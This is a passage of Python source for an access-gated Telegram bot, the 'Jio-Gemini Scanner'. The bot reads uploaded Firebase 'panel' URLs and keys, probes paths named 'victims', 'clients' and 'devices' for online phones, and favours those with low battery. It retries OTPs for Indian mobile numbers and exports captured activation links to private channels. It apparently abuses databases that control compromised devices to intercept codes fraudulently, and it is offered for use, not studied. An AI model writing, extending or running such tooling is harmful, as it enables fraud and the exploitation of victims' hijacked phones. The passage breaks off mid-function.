• <code>/admin</code> — Master control panel, system vitals &amp; uptime
• <code>/users</code> — View registered members, IDs &amp; roles
• <code>/adduser &lt;id&gt;</code> — Whitelist a new member
• <code>/deluser &lt;id&gt;</code> — Revoke member access
• <code>/addadmin &lt;id&gt;</code> — Promote user to Admin
• <code>/deladmin &lt;id&gt;</code> — Demote admin to Member
• <code>/freemode</code> — Toggle Free Access mode ON/OFF
• <code>/broadcast &lt;msg&gt;</code> — Send announcement to all users
• <code>/cleanup</code> — Flush memory &amp; prune temporary files

<b>🚀 Scanner &amp; Core Controls:</b>
• <code>/start</code> — Interactive Main Menu
• <code>/scan</code> — Start 2x2 Parallel Deep Scanner
• <code>/scan resume</code> — Resume interrupted scan
• <code>/status</code> — Live dashboard, dynamic IST ETA &amp; progress
• <code>/stop</code> — Gracefully halt active scan
• <code>/panels</code> — Manage Firebase panels &amp; ping test
• <code>/upload</code> — Upload <code>panels.txt</code> or paste URLs in chat
• <code>/export</code> &amp; <code>/results</code> — Download links &amp; CSV
• <code>/setchannel &lt;id&gt;</code> — Configure log channel
• <code>/setstorage &lt;id&gt;</code> — Configure storage channel
• <code>/id</code> — Inspect chat or user ID"""

        keyboard = [
            [InlineKeyboardButton("⚡ Scanner Hub", callback_data='menu_scanner'), InlineKeyboardButton("👑 Admin Suite", callback_data='menu_admin')],
            [InlineKeyboardButton("📂 Panels & Data", callback_data='menu_panels'), InlineKeyboardButton("📥 Export Hub", callback_data='menu_export')],
            [InlineKeyboardButton("💬 Support (@OwAtom)", url="https://t.me/OwAtom")],
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data='start_menu')]
        ]

    elif is_adm:
        # 🛡️ Secondary Admin View
        log_ch = admin_manager.get_display_log_channel(user_id)
        storage_ch = admin_manager.get_display_storage_channel(user_id)
        text = f"""🛡️ <b>Jio-Gemini Bot — Admin Guide</b>

🛡️ <b>Role:</b> 🛡️ Admin | 🆔 <code>{user_id}</code>
📡 <b>Log Stream:</b> <code>{log_ch}</code>
📦 <b>Storage Backup:</b> <code>{storage_ch}</code>
💬 <b>Support & Owner:</b> @OwAtom

<b>👥 User Management (Admin Controls):</b>
• <code>/users</code> — View registered members, IDs & roles
• <code>/adduser &lt;id&gt;</code> — Whitelist a new member
• <code>/deluser &lt;id&gt;</code> — Remove a member from whitelist
• <code>/admin</code> — Admin control hub & system vitals

<b>🚀 Scanner &amp; Core Controls:</b>
• <code>/start</code> — Interactive Main Menu
• <code>/scan</code> — Start 2x2 Parallel Deep Scanner
• <code>/scan resume</code> — Resume interrupted scan from last batch
• <code>/status</code> — Real-time Dashboard with dynamic IST ETA
• <code>/stop</code> — Gracefully halt active scan
• <code>/panels</code> — Manage Firebase panels &amp; run health ping
• <code>/upload</code> — Upload <code>panels.txt</code> or paste URLs
• <code>/export</code> &amp; <code>/results</code> — Download captured links &amp; CSV
• <code>/channel</code> — View private channel connections
• <code>/setchannel &lt;id&gt;</code> — Link private log channel
• <code>/setstorage &lt;id&gt;</code> — Link private storage channel
• <code>/id</code> — Check User ID &amp; Chat ID

<i>🔒 Note: Admin promotion (/addadmin, /deladmin) and broadcast are reserved for the Super Admin (@OwAtom).</i>"""

        keyboard = [
            [InlineKeyboardButton("⚡ Scanner Hub", callback_data='menu_scanner'), InlineKeyboardButton("🛡️ Admin Suite", callback_data='menu_admin')],
            [InlineKeyboardButton("📂 Panels & Data", callback_data='menu_panels'), InlineKeyboardButton("📥 Export Hub", callback_data='menu_export')],
            [InlineKeyboardButton("💬 Contact Support (@OwAtom)", url="https://t.me/OwAtom")],
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data='start_menu')]
        ]

    else:
        # 👤 Whitelisted Member View (Regular User)
        log_ch = admin_manager.get_display_log_channel(user_id)
        text = f"""❓ <b>Jio-Gemini Scanner — Member Guide</b>

👤 <b>Role:</b> 👤 Member | 🆔 <code>{user_id}</code>
📡 <b>Your Log Channel:</b> <code>{log_ch}</code>
💬 <b>Direct Support:</b> @OwAtom

<b>🚀 Quick Start Guide:</b>
1. <b>Upload Panels:</b> Send a <code>panels.txt</code> file or paste Firebase URLs directly in chat.
2. <b>Run Scanner:</b> Send <code>/scan</code> or click <b>⚡ Scanner Hub ➜ 🚀 Start Scan</b>.
3. <b>Monitor Progress:</b> Send <code>/status</code> to check live stats &amp; remaining time.
4. <b>Export Links:</b> Send <code>/export</code> to download captured activation links.

<b>📋 Member Commands:</b>
• <code>/start</code> — Open interactive Main Menu
• <code>/scan</code> — Start scanner (2x2 Parallel Deep Scan)
• <code>/scan resume</code> — Resume interrupted scan
• <code>/status</code> — Live dashboard &amp; moving-average ETA
• <code>/stop</code> — Stop your active scan
• <code>/panels</code> — View panel count &amp; diagnostics
• <code>/upload</code> — Upload a new <code>panels.txt</code> file
• <code>/export</code> — Download captured links (TXT &amp; CSV)
• <code>/results</code> — Quick download of links &amp; CSV
• <code>/id</code> — Check your User ID &amp; Chat ID
• <code>/channel</code> — Manage your personal log channel
• <code>/setchannel &lt;id&gt;</code> — Link personal log channel
• <code>/help</code> — Open this guide

<b>⚡ Engine Features:</b>
• <b>2-by-2 Streaming:</b> Low RAM usage &amp; fast processing.
• <b>Auto 3-Retry OTP:</b> Automatically retries up to 3 times per number.
• <b>🔋 Low Battery Priority:</b> Prioritizes devices with &le; 15% battery.
• <b>🔄 Smart Auto-Resume:</b> Crash &amp; restart safe.

💬 <b>Need Help or Panel Access?</b>
Click the <b>💬 Contact Support</b> button below to chat with <b>@OwAtom</b> directly."""

        keyboard = [
            [InlineKeyboardButton("⚡ Scanner Hub", callback_data='menu_scanner'), InlineKeyboardButton("📂 Panels & Data", callback_data='menu_panels')],
            [InlineKeyboardButton("📥 Export Hub", callback_data='menu_export'), InlineKeyboardButton("📡 Channels & Logs", callback_data='menu_channels')],
            [InlineKeyboardButton("💬 Contact Support (@OwAtom)", url="https://t.me/OwAtom")],
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data='start_menu')]
        ]

    markup = InlineKeyboardMarkup(keyboard)
    await send_or_edit(update, text, reply_markup=markup)

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, edit_message: bool = False):
    user = update.effective_user
    user_id = user.id if user else 0

    if not admin_manager.has_access(user_id):
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("💬 Contact Support to Get Access", url="https://t.me/OwAtom")],
            [InlineKeyboardButton("🆔 Copy My ID", callback_data='btn_my_id')]
        ])
        msg = (
            f"⛔ <b>Access Denied / Not Authorized</b>\n\n"
            f"🆔 <b>Your User ID:</b> <code>{user_id}</code>\n\n"
            f"Free Mode is OFF. Send your User ID to <b>@OwAtom</b> to get access."
        )
        if update.callback_query:
            try:
                await safe_answer(update, "⛔ Not authorized", show_alert=True)
            except Exception:
                pass
            await send_or_edit(update, msg, reply_markup=keyboard)
        else:
            await update.effective_message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=keyboard)
        return

    session = active_scans.get(user_id)
    is_scanning = session is not None and session.is_active()
    curr_stats = session.stats if is_scanning else (load_scan_state(user_id) or {})

    state_text = "🟢 <b>Scanning Active</b>" if is_scanning else "⚪ <b>Idle / Stopped</b>"
    mode_text = "Deep Scan" if curr_stats.get("is_deep", True) else "Turbo Scan"

    elapsed_str = "00:00"
    if curr_stats.get("start_time"):
        elapsed_sec = int(time.time() - curr_stats["start_time"])
        mins, secs = divmod(elapsed_sec, 60)
        elapsed_str = f"{mins:02d}:{secs:02d}"

    log_ch = admin_manager.get_display_log_channel(user_id)
    storage_ch = admin_manager.get_display_storage_channel(user_id)

    total_b = curr_stats.get("total_batches", 0)
    curr_b = curr_stats.get("last_batch_idx", 0)
    pct = (curr_b / total_b * 100.0) if total_b > 0 else 0.0
    pbar = get_progress_bar(pct)
    eta_rem, finish_time = calculate_eta(curr_stats)

    recent_list = curr_stats.get("recent_captures", [])
    recent_block = ""
    if recent_list:
        recent_lines = ["\n\n🔥 <b>Recent Captures:</b>"]
        for _, c in enumerate(reversed(recent_list[-3:]), 1):
            recent_lines.append(f"  • <code>+91 {c['mobile']}</code> at <code>{c['time']}</code> ✅")
        recent_block = "\n".join(recent_lines)

    text = f"""📈 <b>Your Scanner Live Dashboard</b>

• <b>Status:</b> {state_text}
• <b>Mode:</b> <code>{mode_text}</code>
• <b>Log Channel:</b> <code>{log_ch}</code>
• <b>Storage Channel:</b> <code>{storage_ch}</code>
• <b>Elapsed Time:</b> <code>{elapsed_str}</code>
• <b>Est. Remaining:</b> <code>~{eta_rem}</code>
• <b>Est. Completion:</b> <code>{finish_time}</code>
• <b>Batch Progress:</b> <code>{pbar}</code> ({curr_b}/{total_b})
• <b>Panels Loaded:</b> <code>{curr_stats.get('total_panels', len(load_panels(user_id)))}</code>
• <b>Online Devices:</b> <code>{curr_stats.get('online_devices', 0)}</code>
• <b>Targets Queue:</b> <code>{curr_stats.get('total_targets', 0)}</code>
• <b>Processed:</b> <code>[{curr_stats.get('current_index', 0)}/{curr_stats.get('total_targets', 0)}]</code>
• <b>Current Mobile:</b> <code>{curr_stats.get('current_mobile') or 'None'}</code>
• <b>Success Links:</b> <b>{curr_stats.get('success_count', 0)}</b>
• <b>Failed Attempts:</b> <b>{curr_stats.get('failed_count', 0)}</b>{recent_block}"""

    scan_btn = InlineKeyboardButton("🛑 Stop", callback_data='stop') if is_scanning else InlineKeyboardButton("🚀 Scan", callback_data='scan')
    keyboard = [
        [InlineKeyboardButton("🔄 Refresh", callback_data='status'), scan_btn],
        [InlineKeyboardButton("📥 Export Hub", callback_data='menu_export'), InlineKeyboardButton("📊 Results CSV", callback_data='results')],
        [InlineKeyboardButton("🔙 Main Menu", callback_data='start_menu')]
    ]
    markup = InlineKeyboardMarkup(keyboard)

    if edit_message and update.callback_query:
        try:
            await update.callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
            await safe_answer(update, "Status updated! ⚡")
        except Exception as e:
            if "Message is not modified" in str(e):
                await safe_answer(update, "Dashboard is already up to date! ⚡")
            else:
                try:
                    await safe_answer(update)
                except Exception:
                    pass
                await update.effective_message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
    else:
        await update.effective_message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)

async def setchannel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat = update.effective_chat
    user_id = user.id if user else 0

    if not user_id and chat and chat.type == "channel":
        try:
            admins = await context.bot.get_chat_administrators(chat.id)
            for m in admins:
                if getattr(m, "status", None) == "creator":
                    if admin_manager.has_access(m.user.id):
                        user_id = m.user.id
                        user = m.user
                        break
            if not user_id:
                for m in admins:
                    if admin_manager.has_access(m.user.id):
                        user_id = m.user.id
                        user = m.user
                        break
        except Exception as e:
            logger.debug(f"Could not get channel creator/admin: {e}")

    if not user_id or not admin_manager.has_access(user_id):
        if chat and chat.type == "channel":
            await update.effective_message.reply_text(
                f"💡 <b>Channel ID:</b> <code>{chat.id}</code>\n\n"
                f"To link this channel as your Log Channel, send:\n"
                f"<code>/setchannel {chat.id}</code>\n"
                f"in your private chat with the bot!",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.effective_message.reply_text("⛔ <b>Not authorized</b>", parse_mode=ParseMode.HTML)
        return

    args = list(context.args or [])
    if update.effective_message and update.effective_message.text:
        cmd_word = update.effective_message.text.split()[0].lower()
        if "del" in cmd_word or "unset" in cmd_word:
            args = ["off"]
    target_id = None

    if args:
        val = args[0].strip()
        if val.lower() in ("off", "disable", "none", "remove", "clear"):
            admin_manager.set_user_log_channel(user_id, None)
            await update.effective_message.reply_text("⚪ <b>Your private log channel disabled.</b>", parse_mode=ParseMode.HTML)
            return
        target_id = val
    else:
        if chat.type in ("channel", "group", "supergroup"):
            target_id = str(chat.id)

    if not target_id:
        curr = admin_manager.get_display_log_channel(user_id)
        await update.effective_message.reply_text(
            f"📡 <b>Set Private Log Channel</b>\n\n"
            f"• <b>Current Channel:</b> <code>{curr}</code>\n\n"
            f"<b>Usage:</b>\n"
            f"• <code>/setchannel -1001234567890</code>\n"
            f"• <code>/setchannel off</code> (Disable)\n"
            f"• Or run <code>/setchannel</code> directly inside the target channel/group.",
            parse_mode=ParseMode.HTML
        )
        return

    try:
        user_fname = (user.first_name or "User") if user else "User"
        await context.bot.send_message(
            chat_id=target_id,
            text=f"🔔 <b>Log Channel Connected</b>\n\nLive logs for <b>{html.escape(user_fname)}</b> will be streamed here.",
            parse_mode=ParseMode.HTML
        )
        if admin_manager.is_super_admin(user_id):
            admin_manager.set_master_log_channel(target_id)
        admin_manager.set_user_log_channel(user_id, target_id)
        channel_desc = "Master & Private Log channel" if admin_manager.is_super_admin(user_id) else "Log channel"
        await update.effective_message.reply_text(
            f"✅ {channel_desc} successfully set to <code>{target_id}</code>!",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"❌ <b>Failed to connect to channel:</b> <code>{html.escape(str(e))}</code>\n\n"
            f"Make sure you added the bot as an <b>Admin</b> with <b>Post Messages</b> permission!",
            parse_mode=ParseMode.HTML
        )

async def setstorage_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat = update.effective_chat
    user_id = user.id if user else 0

    if not user_id and chat and chat.type == "channel":
        try:
            admins = await context.bot.get_chat_administrators(chat.id)
            for m in admins:
                if getattr(m, "status", None) == "creator":
                    if admin_manager.has_access(m.user.id):
                        user_id = m.user.id
                        user = m.user
                        break
            if not user_id:
                for m in admins:
                    if admin_manager.has_access(m.user.id):
                        user_id = m.user.id
                        user = m.user
                        break
        except Exception as e:
            logger.debug(f"Could not get channel creator/admin: {e}")

    if not user_id or not admin_manager.has_access(user_id):
        if chat and chat.type == "channel":
            await update.effective_message.reply_text(
                f"💡 <b>Channel ID:</b> <code>{chat.id}</code>\n\n"
                f"To link this channel as your Private Storage Channel, send:\n"
                f"<code>/setstorage {chat.id}</code>\n"
                f"in your private chat with the bot!",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.effective_message.reply_text("⛔ <b>Not authorized</b>", parse_mode=ParseMode.HTML)
        return

    args = list(context.args or [])
    if update.effective_message and update.effective_message.text:
        cmd_word = update.effective_message.text.split()[0].lower()
        if "del" in cmd_word or "unset" in cmd_word:
            args = ["off"]
    target_id = None

    if args:
        val = args[0].strip()
        if val.lower() in ("off", "disable", "none", "remove", "clear"):
            admin_manager.set_user_storage_channel(user_id, None)
            if not admin_manager.is_super_admin(user_id):
                await update.effective_message.reply_text(
                    "⚪ <b>Your private storage channel disabled.</b>\n\n"
                    "⚠️ <i>Note: Linking a storage channel is compulsory before running /scan.</i>",
                    parse_mode=ParseMode.HTML
                )
            else:
                await update.effective_message.reply_text("⚪ <b>Your personal storage channel cleared (falling back to Master Storage).</b>", parse_mode=ParseMode.HTML)
            return
        target_id = val
    else:
        chat = update.effective_chat
        if chat.type in ("channel", "group", "supergroup"):
            target_id = str(chat.id)

    if not target_id:
        curr = admin_manager.get_display_storage_channel(user_id)
        compulsory_txt = " <i>(Compulsory for scanning)</i>" if not admin_manager.is_super_admin(user_id) else ""
        await update.effective_message.reply_text(
            f"📦 <b>Set Private Storage Channel</b>{compulsory_txt}\n\n"
            f"• <b>Current Channel:</b> <code>{curr}</code>\n\n"
            f"<b>Usage:</b>\n"
            f"• <code>/setstorage -1001234567890</code>\n"
            f"• <code>/setstorage off</code> (Disable)\n"
            f"• Or run <code>/setstorage</code> directly inside the target channel/group.",
            parse_mode=ParseMode.HTML
        )
        return

    try:
        user_fname = (user.first_name or "User") if user else "User"
        await context.bot.send_message(
            chat_id=target_id,
            text=f"📦 <b>Storage Channel Connected</b>\n\nActivation links, results CSV, and panels backups for <b>{html.escape(user_fname)}</b> (ID: <code>{user_id}</code>) will be saved here.",
            parse_mode=ParseMode.HTML
        )
        if admin_manager.is_super_admin(user_id):
            admin_manager.set_master_storage_channel(target_id)
        admin_manager.set_user_storage_channel(user_id, target_id)
        channel_desc = "Master & Private Storage channel" if admin_manager.is_super_admin(user_id) else "Storage channel"
        await update.effective_message.reply_text(
            f"✅ {channel_desc} successfully set to <code>{target_id}</code>!\n\n"
            f"🔒 All your scans, activation links, and panel backups are now fully isolated and backed up here.",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"❌ <b>Failed to connect to storage channel:</b> <code>{html.escape(str(e))}</code>\n\n"
            f"Make sure you added the bot as an <b>Admin</b> with <b>Post Messages</b> permission!",
            parse_mode=ParseMode.HTML
        )

async def channel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_channels_menu(update, context)

async def scan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id if user else 0
    if not admin_manager.has_access(user_id):
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("💬 Contact Support to Get Access", url="https://t.me/OwAtom")],
            [InlineKeyboardButton("🆔 Copy My ID", callback_data='btn_my_id')]
        ])
        await update.effective_message.reply_text(
            f"⛔ <b>Access Denied / Not Authorized</b>\n\n"
            f"🆔 <b>Your User ID:</b> <code>{user_id}</code>\n\n"
            f"Free Mode is OFF. Send your User ID to <b>@OwAtom</b> to request access.",
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
        return

    # Check Compulsory Storage Channel for non-superadmin users
    if not admin_manager.has_storage_channel(user_id):
        warn_text = (
            "⚠️ <b>Storage Channel Required!</b>\n\n"
            "Setting your private storage channel is <b>compulsory</b> before running scans, so all your captured links and results are backed up securely.\n\n"
            "👉 <b>How to set up:</b>\n"
            "1. Add this bot as an <b>Admin</b> in your private channel or group (with <b>Post Messages</b> permission).\n"
            "2. Send <code>/setstorage &lt;channel_id&gt;</code> here in chat, or send <code>/setstorage</code> inside your channel.\n\n"
            "💡 <i>Need your channel ID? Send <code>/id</code> inside your channel!</i>"
        )
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📡 Open Channels Menu", callback_data='menu_channels')],
            [InlineKeyboardButton("🔙 Back to Scanner", callback_data='menu_scanner')]
        ])
        await send_or_edit(update, warn_text, reply_markup=keyboard)
        return

    if is_user_scanning(user_id):
        if update.callback_query:
            await safe_answer(update, "⚠️ Your scan is already running! Use /stop or click Stop Scan.", show_alert=True)
        else:
            await update.effective_message.reply_text("⚠️ <b>Your scan is already running!</b> Use /stop to halt your scan.", parse_mode=ParseMode.HTML)
        return

    user_panels_file = get_user_panels_file(user_id)
    if not user_panels_file.exists() or user_panels_file.stat().st_size == 0:
        if admin_manager.is_super_admin(user_id) and PANELS_FILE.exists() and PANELS_FILE.stat().st_size > 0:
            try:
                import shutil
                shutil.copy2(PANELS_FILE, user_panels_file)
            except Exception:
                user_panels_file = PANELS_FILE
        else:
            restored = await restore_panels_from_storage(context.bot, user_id)
            if not restored or not user_panels_file.exists() or user_panels_file.stat().st_size == 0:
                no_panels_text = (
                    "❌ <b>No panels found in your workspace!</b>\n\n"
                    "Please upload your <code>panels.txt</code> file using /upload or paste Firebase URLs directly in this chat."
                )
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("📂 Panels Menu", callback_data='menu_panels')],
                    [InlineKeyboardButton("🔙 Back to Scanner", callback_data='menu_scanner')]
                ])
                await send_or_edit(update, no_panels_text, reply_markup=keyboard)
                return

    args = context.args or []
    limit = 0
    skip = 0
    is_deep = True  # Always deep by default
    resume_mode = False
    fresh_mode = False
    scan_all_mode = False

    for a in args:
        al = str(a).lower()
        if al in ("resume", "--resume", "-r"):
            resume_mode = True
        elif al in ("fresh", "new", "--fresh", "-f"):
            fresh_mode = True
        elif al in ("all", "--all", "-a"):
            scan_all_mode = True
        elif al in ("quick", "fast", "standard"):
            is_deep = False
        elif al.isdigit():
            if limit == 0:
                limit = int(al)
            elif skip == 0:
                skip = int(al)

    saved_st = load_scan_state(user_id)
    has_unfinished = (
        saved_st is not None
        and not saved_st.get("finished", False)
        and saved_st.get("last_batch_idx", 0) > 0
        and (saved_st.get("total_batches", 0) == 0 or saved_st.get("last_batch_idx", 0) < saved_st.get("total_batches", 0))
    )

    # If previous scan was unfinished and user ran plain /scan (no explicit flags):
    if has_unfinished and not resume_mode and not fresh_mode and not scan_all_mode and limit == 0 and skip == 0:
        last_b = saved_st.get("last_batch_idx", 0)
        tot_b = saved_st.get("total_batches", 0)
        prev_hits = saved_st.get("success", 0)
        prev_fails = saved_st.get("failed", 0)
        paused_card = (
            f"⚡ <b>Scanner Options</b>\n\n"
            f"You have an unfinished scan saved:\n"
            f"• <b>Paused At:</b> Batch <code>{last_b}</code> of <code>{tot_b}</code>\n"
            f"• 🎯 <b>Hits Captured:</b> <b>{prev_hits}</b> | ❌ <b>Failed:</b> <code>{prev_fails}</code>\n\n"
            f"👉 <b>Choose how you would like to proceed:</b>"
        )
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("⏯️ Continue Previous Scan", callback_data='scan_resume')],
            [InlineKeyboardButton("🔄 Run New Scan", callback_data='scan_fresh'), InlineKeyboardButton("🌐 Scan All", callback_data='scan_all')],
            [InlineKeyboardButton("⚡ Scanner Menu", callback_data='menu_scanner'), InlineKeyboardButton("🔙 Main Menu", callback_data='start_menu')]
        ])
        await send_or_edit(update, paused_card, reply_markup=keyboard)
        return

    if scan_all_mode:
        fresh_mode = True
        limit = 0
        skip = 0
        if admin_manager.is_super_admin(user_id) and PANELS_FILE.exists() and PANELS_FILE.stat().st_size > 0:
            try:
                import shutil
                shutil.copy2(PANELS_FILE, user_panels_file)
            except Exception:
                pass

    if fresh_mode:
        clear_scan_state(user_id)
        saved_st = None

    start_batch_idx = 0
    if resume_mode and saved_st:
        if not limit and saved_st.get("limit"):
            limit = saved_st.get("limit", 0)
        if not skip and saved_st.get("skip"):
            skip = saved_st.get("skip", 0)
        if saved_st.get("is_deep") is not None:
            is_deep = saved_st.get("is_deep", True)
        start_batch_idx = saved_st.get("last_batch_idx", 0)

    chat_id = update.effective_chat.id

    # Pre-count panels for this user
    panels_count = 0
    try:
        with open(user_panels_file, "r", encoding="utf-8", errors="ignore") as pf:
            panels_count = sum(1 for pl in pf if pl.strip() and not pl.strip().startswith("#") and "firebase" in pl.lower())
    except Exception:
        pass

    if limit and limit < panels_count:
        panels_count = limit
    if skip and panels_count > skip:
        panels_count -= skip

    est_batches = max(1, (panels_count + 1) // 2) if panels_count > 0 else 1
    if resume_mode and saved_st and saved_st.get("total_batches"):
        est_batches = saved_st.get("total_batches", est_batches)

    session = UserScanSession(user_id=user_id, chat_id=chat_id, progress_msg_id=0, is_deep=is_deep)
    session.user_info = {
        "user_id": user_id,
        "username": (user.username or "") if user else "",
        "first_name": (user.first_name or "User") if user else "User"
    }
    session.stats["total_batches"] = est_batches
    session.stats["start_time"] = time.time()
    session.stats["last_batch_idx"] = start_batch_idx
    if resume_mode and saved_st:
        session.stats["success_count"] = saved_st.get("success", 0)
        session.stats["failed_count"] = saved_st.get("failed", 0)
        session.stats["online_devices"] = saved_st.get("online_devices", 0)
    session.stats["batch_times"] = []

    init_pct = (start_batch_idx / est_batches * 100.0) if est_batches > 0 else 0.0
    init_pbar = get_progress_bar(init_pct)
    init_eta, finish_clock = calculate_eta(session)
    mode_title = "Resume Scan" if resume_mode else "2x2 Deep Scanner"
    user_cfg = get_user_scan_config(user_id)
    mode_desc = "⚡ Turbo (1x, 18s)" if user_cfg["mode"] == "turbo" else "🔍 Deep (2x, 15s)"
    _, local_ts = get_current_time()

    resume_extra = ""
    if resume_mode and saved_st:
        prev_hits = saved_st.get("success", 0)
        prev_fails = saved_st.get("failed", 0)
        resume_extra = f"🎯 <b>Previous Hits:</b> <b>{prev_hits}</b> | ❌ <b>Failed:</b> <code>{prev_fails}</code>\n💡 <i>Resuming from saved batch. Send /scan fresh to restart from Batch 1.</i>\n"

    loading_card = (
        f"🚀 <b>Initializing {mode_title}...</b>\n\n"
        f"📊 <b>Loading Progress:</b>\n"
        f"<code>{init_pbar}</code> ({start_batch_idx}/{est_batches} Batches)\n\n"
        f"📍 <b>Status:</b> <code>Starting 2x2 scanner engine & probing panels...</code>\n"
        f"⚙️ <b>Engine Mode:</b> <code>{mode_desc}</code>\n"
        f"{resume_extra}\n"
        f"⏳ <b>Estimated Time:</b> <code>~{init_eta}</code>\n"
        f"🏁 <b>Est. Completion:</b> <code>{finish_clock}</code>\n"
        f"🕒 <i>Started: {local_ts} (IST)</i>"
    )

    loading_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 Stop Scan", callback_data='stop'), InlineKeyboardButton("📈 Live Status", callback_data='status')]
    ])
    msg = await send_or_edit(
        update,
        loading_card,
        reply_markup=loading_markup
    )
    if msg:
        session.progress_msg_id = msg.message_id
    active_scans[user_id] = session

    session.task = asyncio.create_task(do_scan(context, session, limit, skip, is_deep, resume_mode))

async def do_scan(context: ContextTypes.DEFAULT_TYPE, session: UserScanSession, limit: int, skip: int, is_deep: bool = True, resume_mode: bool = False):
    user_id = session.user_id
    chat_id = session.chat_id
    scan_stats = session.stats
    user_cfg = get_user_scan_config(user_id)

    scan_stats["start_time"] = time.time()
    scan_stats["is_deep"] = is_deep
    scan_stats["current_mobile"] = ""
    scan_stats["batch_times"] = []

    start_batch_idx = 1
    results = {"success": 0, "failed": 0}
    total_online_found = 0
    total_processed_targets = 0

    if resume_mode:
        saved_st = load_scan_state(user_id)
        if saved_st and saved_st.get("last_batch_idx"):
            start_batch_idx = saved_st["last_batch_idx"] + 1
            results["success"] = saved_st.get("success", 0)
            results["failed"] = saved_st.get("failed", 0)
            total_online_found = saved_st.get("online_devices", 0)
            total_processed_targets = saved_st.get("targets_processed", 0)
            if not limit and saved_st.get("limit"):
                limit = saved_st.get("limit", 0)
            if not skip and saved_st.get("skip"):
                skip = saved_st.get("skip", 0)
            if saved_st.get("is_deep") is not None:
                is_deep = saved_st.get("is_deep", True)
                session.is_deep = is_deep
            logger.info(f"[User {user_id}] Resuming scan from batch {start_batch_idx} (Hits: {results['success']}, Failed: {results['failed']})")
    else:
        fresh_f = get_user_fresh_links_file(user_id)
        if fresh_f.exists():
            try:
                fresh_f.unlink()
            except Exception:
                pass

    scan_stats["success_count"] = results["success"]
    scan_stats["failed_count"] = results["failed"]
    scan_stats["online_devices"] = total_online_found
    scan_stats["current_index"] = total_processed_targets

    try:
        await update_progress(context, session, "Loading your panels from disk...")
        loop = asyncio.get_running_loop()
        panels = await loop.run_in_executor(_SCAN_EXECUTOR, load_panels, user_id)

        if skip:
            panels = panels[skip:]
        if limit:
            panels = panels[:limit]

        scan_stats["total_panels"] = len(panels)
        if not panels:
            await safe_telegram_call(context.bot.send_message, chat_id=chat_id, text="❌ No panels found in your workspace!", parse_mode=ParseMode.HTML)
            return

        BATCH_SIZE = 2
        panel_batches = [panels[i:i + BATCH_SIZE] for i in range(0, len(panels), BATCH_SIZE)]
        scan_stats["total_batches"] = len(panel_batches)

        if resume_mode and start_batch_idx > len(panel_batches):
            await safe_telegram_call(
                context.bot.send_message,
                chat_id=chat_id,
                text="ℹ️ <b>All panel batches have already been scanned for this workspace!</b>\n\nRun a fresh <code>/scan</code> to start over.",
                parse_mode=ParseMode.HTML
            )
            return

        logger.info(f"[User {user_id}] Starting 2x2 scan across {len(panels)} panels ({len(panel_batches)} batches)...")
        await update_progress(context, session, f"Probing {len(panels)} panels in 2-by-2 stream...", force=True)

        def scan_one_panel(url, key):
            with fb_session() as fb:
                devices = {}
                candidate_paths = [
                    "clients", "devices", "data/clients", "data/devices",
                    "user_data", "users", "All_User", "Verify_Device",
                    "victim", "victims", "client", "device", "all_clients"
                ]
                idx = 0
                checked_root_shallow = False
                while idx < len(candidate_paths):
                    path = candidate_paths[idx]
                    idx += 1
                    try:
                        resp = None
                        # 1. Fast path: try native limitToLast=30 to fetch recent active devices in 1 single call
                        try:
                            resp = fb_get(fb, url, key, path, {"orderBy": '"$key"', "limitToLast": 30}, raise_on_too_large=True)
                        except Exception:
                            resp = None

                        if not resp or not isinstance(resp, dict):
                            try:
                                resp = fb_get(fb, url, key, path, raise_on_too_large=True)
                            except PayloadTooLargeError:
                                logger.info(f"Panel {url}/{path} is massive (>2MB). Switching to shallow sampling to prevent OOM...")
                                shallow_resp = fb_get(fb, url, key, path, {"shallow": "true"})
                                if isinstance(shallow_resp, dict) and shallow_resp:
                                    sample_keys = list(shallow_resp.keys())[-30:]
                                    resp = {}
                                    def _fetch_single_dev(skey):
                                        try:
                                            with fb_session() as s_single:
                                                dev_obj = fb_get(s_single, url, key, f"{path}/{skey}")
                                                if isinstance(dev_obj, dict):
                                                    return str(skey), dev_obj
                                        except Exception:
                                            pass
                                        return None

                                    fetched = list(_SHALLOW_EXECUTOR.map(_fetch_single_dev, sample_keys))
                                    for item in fetched:
                                        if item:
                                            resp[item[0]] = item[1]
                                else:
                                    resp = {}

                        if isinstance(resp, dict) and resp:
                            for did, data in resp.items():
                                if isinstance(data, dict) and is_device_online(data):
                                    b_pct, is_chg = get_device_battery(data)
                                    pruned_data = dict(data)
                                    pruned_data["_battery"] = b_pct
                                    pruned_data["_charging"] = is_chg
                                    devices[str(did)] = {
                                        "url": url, "key": key, "data": pruned_data, "base_path": path
                                    }
                            if devices:
                                break
                    except Exception as e:
                        logger.debug(f"Error checking {url}/{path}: {e}")
                        continue

                    # If initial standard paths found nothing and we haven't probed root shallow yet:
                    if not devices and not checked_root_shallow and idx >= 4:
                        checked_root_shallow = True
                        try:
                            root_keys = fb_get(fb, url, key, "", {"shallow": "true"})
                            if isinstance(root_keys, dict) and root_keys:
                                for rk in list(root_keys.keys())[:15]:
                                    rk_clean = str(rk).strip()
                                    rk_lower = rk_clean.lower()
